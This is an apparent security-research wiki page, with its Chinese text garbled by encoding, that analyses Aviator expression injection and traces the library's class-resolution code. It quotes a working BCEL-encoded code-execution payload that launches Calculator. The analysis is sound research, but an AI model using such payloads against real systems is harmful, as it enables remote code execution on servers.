<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-java/Expression/Aviator/Aviator" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.1.0">
<title data-rh="true">ç»“åˆ Jimureport çš„æŸä¸ªæ¼æ´æŠ«éœ²çœ‹ Aviator è¡¨è¾¾å¼æ³¨å…¥ ğŸ¦– Whoopsunix</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://whoopsunix.com/docs/java/Expression/Aviator/"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="ç»“åˆ Jimureport çš„æŸä¸ªæ¼æ´æŠ«éœ²çœ‹ Aviator è¡¨è¾¾å¼æ³¨å…¥ ğŸ¦– Whoopsunix"><meta data-rh="true" name="description" content="JDK é«˜ç‰ˆæœ¬çš„ Aviator è¡¨è¾¾å¼æ³¨å…¥"><meta data-rh="true" property="og:description" content="JDK é«˜ç‰ˆæœ¬çš„ Aviator è¡¨è¾¾å¼æ³¨å…¥"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://whoopsunix.com/docs/java/Expression/Aviator/"><link data-rh="true" rel="alternate" href="https://whoopsunix.com/docs/java/Expression/Aviator/" hreflang="en"><link data-rh="true" rel="alternate" href="https://whoopsunix.com/docs/java/Expression/Aviator/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Whoopsunix RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Whoopsunix Atom Feed"><link rel="stylesheet" href="/assets/css/styles.e447ecda.css">
<link rel="preload" href="/assets/js/runtime~main.d07571fe.js" as="script">
<link rel="preload" href="/assets/js/main.c18b1eab.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><b class="navbar__title text--truncate">Whoopsunix</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/time/">WIKI</a><a class="navbar__item navbar__link" href="/blog">Blog</a><a class="navbar__item navbar__link" href="/docs/tags">Tag</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/Whoopsunix" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/time/">æ—¶é—´çº¿</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/PPPYSO/">PPPYSO</a><button aria-label="Expand sidebar category &#x27;PPPYSO&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/docs/category/java-å®‰å…¨">Java å®‰å…¨</a><button aria-label="Collapse sidebar category &#x27;Java å®‰å…¨&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" tabindex="0" href="/docs/category/è¡¨è¾¾å¼æ³¨å…¥">è¡¨è¾¾å¼æ³¨å…¥</a><button aria-label="Collapse sidebar category &#x27;è¡¨è¾¾å¼æ³¨å…¥&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/java/Expression/Aviator/">ç»“åˆ Jimureport çš„æŸä¸ªæ¼æ´æŠ«éœ²çœ‹ Aviator è¡¨è¾¾å¼æ³¨å…¥</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/docs/java/SAST/">SAST ä¹‹è·¯</a><button aria-label="Expand sidebar category &#x27;SAST ä¹‹è·¯&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/java/named module/">JDK 17+ FreeMarker SSTIï¼šä» CVE-2023-4450 å¤ç°å¼•å‡º MethodHandle å¥æŸ„ã€named module æœºåˆ¶ç ”ç©¶</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/docs/java/RASP/RASPBypass">RASP</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/components/">ç»„ä»¶æ¼æ´åˆ†æ</a><button aria-label="Expand sidebar category &#x27;ç»„ä»¶æ¼æ´åˆ†æ&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/readTeam/">RT Attack</a><button aria-label="Expand sidebar category &#x27;RT Attack&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/DevOpsAttack/">DevOps Attack</a><button aria-label="Expand sidebar category &#x27;DevOps Attack&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/java-å®‰å…¨"><span itemprop="name">Java å®‰å…¨</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/è¡¨è¾¾å¼æ³¨å…¥"><span itemprop="name">è¡¨è¾¾å¼æ³¨å…¥</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">ç»“åˆ Jimureport çš„æŸä¸ªæ¼æ´æŠ«éœ²çœ‹ Aviator è¡¨è¾¾å¼æ³¨å…¥</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>ç»“åˆ Jimureport çš„æŸä¸ªæ¼æ´æŠ«éœ²çœ‹ Aviator è¡¨è¾¾å¼æ³¨å…¥</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jdk-é«˜ç‰ˆæœ¬çš„-aviator-è¡¨è¾¾å¼æ³¨å…¥">JDK é«˜ç‰ˆæœ¬çš„ Aviator è¡¨è¾¾å¼æ³¨å…¥<a href="#jdk-é«˜ç‰ˆæœ¬çš„-aviator-è¡¨è¾¾å¼æ³¨å…¥" class="hash-link" aria-label="Direct link to JDK é«˜ç‰ˆæœ¬çš„ Aviator è¡¨è¾¾å¼æ³¨å…¥" title="Direct link to JDK é«˜ç‰ˆæœ¬çš„ Aviator è¡¨è¾¾å¼æ³¨å…¥">â€‹</a></h2>
<p>Aviator è¡¨è¾¾å¼æ³¨å…¥ä»£ç ç¤ºä¾‹è§ <a href="https://github.com/Whoopsunix/JavaRce/blob/main/SecVulns/VulnCore/Expression/AviatorAttack/src/main/java/com/ppp/aviator/AviatorDemo.java" target="_blank" rel="noopener noreferrer">JavaRce é¡¹ç›®</a> ï¼Œåœ¨ä¹‹å‰ aviatorscript çš„<a href="https://github.com/killme2008/aviatorscript/issues/421" target="_blank" rel="noopener noreferrer">æ¼æ´æŠ«éœ²</a>ç»™å‡ºäº†äº†å¦‚ä¸‹å½¢å¼çš„ payloadï¼Œåˆ©ç”¨ bcel æ¥åŠ è½½å­—èŠ‚ç </p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;a&#x27;+(c=Class.forName(\&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\&quot;,true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\&quot;open -a Calculator.app\&quot;) );</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>æå–å‡ºå…¶ä¸­çš„ <code>Class.forName()</code> è°ƒè¯•ä¸€ä¸‹ä»£ç </p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token class-name">AviatorEvaluatorInstance</span><span class="token plain"> evaluator </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">AviatorEvaluator</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">newInstance</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">evaluator</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">execute</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Class.forName(&#x27;java.lang.String&#x27;)&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>é€šè¿‡ <code>com.googlecode.aviator.RuntimeFunctionDelegator#getFunc()</code> åŠ¨æ€è°ƒç”¨ Aviator ä¸­å®šä¹‰çš„æ–¹æ³•</p>
<p><img loading="lazy" alt="image-20240807111409385" src="/assets/images/image-20240807111409385-754c9fd65f74a49b5e19d3fd1006212d.png" width="1830" height="660" class="img_ev3q"></p>
<p>è€Œæ¢æˆå…¨é™å®šç±»ååï¼Œæ‰§è¡Œ <code>getFunc()</code> æ–¹æ³•ä¼šæŠ¥é”™ <code>Function not found: java.lang.Class.forName</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token class-name">AviatorEvaluatorInstance</span><span class="token plain"> evaluator </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">AviatorEvaluator</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">newInstance</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">evaluator</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">execute</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;java.lang.Class.forName(&#x27;java.lang.String&#x27;)&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>è°ƒè¯•åˆ° <code>com.googlecode.aviator.utils.Env#resolveClassSymbol(java.lang.String, boolean)</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¸»è¦æ˜¯ç”¨äºå°†ç±»åè§£æä¸ºå¯¹åº”çš„ Java ç±»å¯¹è±¡ã€‚</p>
<p><img loading="lazy" alt="image-20240807111809524" src="/assets/images/image-20240807111809524-95b4621b756070cd654268db569801ec.png" width="2060" height="1192" class="img_ev3q"></p>
<p>è¿™é‡Œçš„è¯æœ‰ä¸¤ä¸ªå€¼å¾—çœ‹çš„åœ°æ–¹ï¼š</p>
<ol>
<li>ä»è¿™ä¸ªä»£ç çš„é€»è¾‘æ¥çœ‹ï¼Œå¦‚æœåŒ…å« <code>.</code> åˆ™ç›´æ¥è°ƒç”¨ <code>classForName(name)</code> æ–¹æ³•æ¥è·å–ç±»å¯¹è±¡ï¼Œæˆ‘ä»¬æ„é€ çš„æ˜¯å…¨é™å®šç±»åï¼Œä¸ºä»€ä¹ˆä¼ å…¥çš„ name æ˜¯ <code>java</code></li>
<li>ç¬¬äºŒä¸ªæ¡ä»¶é€»è¾‘ï¼Œå› ä¸ºä¸å­˜åœ¨ç±»åæ—¶ä¼šå‡è®¾è¯¥ç±»éš¶å±äº <code>java.lang</code> åŒ…ä¸‹ ï¼Œå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆç›´æ¥ç”¨ <code>Class.forName()</code> å¯ä»¥æ‰§è¡Œã€‚</li>
</ol>
<p>ç¬¬ä¸€ä¸ªé—®é¢˜å®šä½åˆ° <code>com.googlecode.aviator.runtime.type.AviatorJavaType#getProperty()</code> æ–¹æ³•ï¼Œå› ä¸ºåŒ…å« <code>.</code> æ‰€ä»¥è¢«åˆ†å‰²ä¸ºæ•°ç»„ï¼Œç„¶ååœ¨ <code>com.googlecode.aviator.utils.Reflector#fastGetProperty()</code> æ–¹æ³•éå†é€ä¸ªè§£æ</p>
<p><img loading="lazy" alt="image-20240807112532434" src="/assets/images/image-20240807112532434-61ae3abd5f3402f6ee4a060fe04a7a5d.png" width="1902" height="396" class="img_ev3q"></p>
<p><img loading="lazy" alt="image-20240807112604647" src="/assets/images/image-20240807112604647-3797886429f21e55764143c437437d1e.png" width="1884" height="376" class="img_ev3q"></p>
<p><code>java.lang</code> åŒ…ä¸‹çš„ç±»æœ‰é™ï¼Œæ‰€ä»¥è¿˜éœ€è¦å¯»æ±‚çªç ´ã€‚æˆ‘ä»¬çœ‹åˆ°è¿˜æœ‰ä¿©é€»è¾‘ï¼Œç”¨äºå¼•å…¥åŒ…ã€ç±»ã€‚è¿™ä¸ªè§£ç­”ç¬¬äºŒä¸ªé—®é¢˜çš„ç–‘é—®ã€‚</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// from imported packages</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">clazz </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">resolveFromImportedPackages</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">clazz </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">checkIfClassIsAllowed</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">checkIfAllow</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> clazz</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// from imported classes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">clazz </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">resolveFromImportedSymbols</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> clazz</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">clazz </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">checkIfClassIsAllowed</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">checkIfAllow</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> clazz</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>ä»¥åŒ…åä¸ºä¾‹ï¼Œæ˜¯è¯»å–çš„ <code>this.importedPackages</code> å¯¹è±¡ï¼Œç´¢æ€§ç”¨çš„æ¯”è¾ƒå°‘ï¼Œå¯ä»¥å¾ˆè½»æ˜“çš„è·Ÿåˆ° <code>com.googlecode.aviator.runtime.function.internal.UseFunction#addSym()</code> æ–¹æ³•ã€‚</p>
<p><img loading="lazy" alt="image-20240807113101449" src="/assets/images/image-20240807113101449-402f2bbbae54115292fc5968d486d312.png" width="1210" height="528" class="img_ev3q"></p>
<p><code>*</code> å·ç»™äº†å¾ˆå¤§çš„æç¤ºï¼Œç„¶åå°±æ˜¯ç¿»å®˜æ–¹æ–‡æ¡£äº†ï¼Œæ‰¾åˆ°å¼•ç”¨ Java ç±»çš„è¯­æ³• <a href="https://www.yuque.com/boyan-avfmj/aviatorscript/vk0ubs" target="_blank" rel="noopener noreferrer">https://www.yuque.com/boyan-avfmj/aviatorscript/vk0ubs</a></p>
